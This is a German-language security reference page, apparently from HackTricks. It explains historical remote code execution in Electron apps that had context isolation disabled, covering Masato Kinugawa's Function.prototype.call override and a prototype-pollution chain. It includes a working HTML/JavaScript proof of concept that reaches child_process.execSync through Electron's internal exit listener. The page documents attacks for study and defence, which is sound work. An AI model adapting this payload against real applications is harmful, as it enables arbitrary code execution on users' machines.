# RCE in Electron durch Context Isolation über internen Code

{{#include ../../banners/hacktricks-training.md}}

Dies sind **historische Exploit-Muster** für Electron-Anwendungen, die nicht vertrauenswürdige Renderer-Inhalte ohne Context Isolation ausführten. Context Isolation ist seit Electron 12 standardmäßig aktiviert und bleibt eine empfohlene Sicherheitseinstellung.<sup>[[1]](#references)</sup> Die genauen Interna unterscheiden sich je nach Electron- und Node.js-Version. Reproduziere daher eine Exploit-Kette mit den gebündelten Versionen der Zielanwendung.

## Beispiel 1: Überschreiben von `Function.prototype.call`

Dieses Beispiel stammt aus Masato Kinugawas Präsentation auf der CureCon.<sup>[[2]](#references)</sup>

Im betroffenen historischen Electron-Build registrierte der interne ASAR-Code einen `exit`-Listener für den Prozess. Da Seitencode und interner Electron-Code bei deaktivierter Context Isolation dieselben JavaScript-Prototypen verwendeten, konnte Renderer-Code `Function.prototype.call` ersetzen, bevor der interne Listener ausgeführt wurde.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Electron-interner asar.js-Codepfad, der im contextIsolation-RCE-Beispiel verwendet wird](<../../images/image (1070).png>)

Der Listener wurde über den Event-Mechanismus von Node.js ausgelöst. Die ursprüngliche Seite verwies auf einen veralteten Pfad `bin/events.js`; der Quellcode desselben historischen Commits befindet sich unter `lib/events.js`.<sup>[[5]](#references)</sup>

![Node-events.js-Codepfad, der von der Electron-contextIsolation-RCE-Kette erreicht wird](<../../images/image (793).png>)

In diesem Pfad ist `self` das `process`-Objekt von Node.js:

![Electron contextIsolation RCE über internen Electron-Code – Beispiel 1: Hier ist „self“ das process-Objekt von Node.js](<../../images/image (700).png>)

Das historische `process`-Objekt bot einen Pfad zu `require`:

```
process.mainModule.require
```

Da der Listener-Dispatcher den Handler mit dem process-Objekt aufrief, konnte das Überschreiben von call dieses Objekt wiederherstellen und einen nativen Befehl ausführen:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Beispiel 2: prototype pollution

Die ElectroVolt-Präsentation demonstriert eine weitere historische Angriffskette, die über prototype pollution ein `require`-Objekt erhält.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron-Dokumentation – Kontextisolierung](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Ausnutzen der fehlenden Kontextisolierung – CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Historischer Electron-Quellcode – lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Übernahme beliebter Desktop-Apps und Aufdecken neuer Angriffsflächen in Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Historischer Node.js-Quellcode – Listener-Verteilung in `lib/events.js`](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
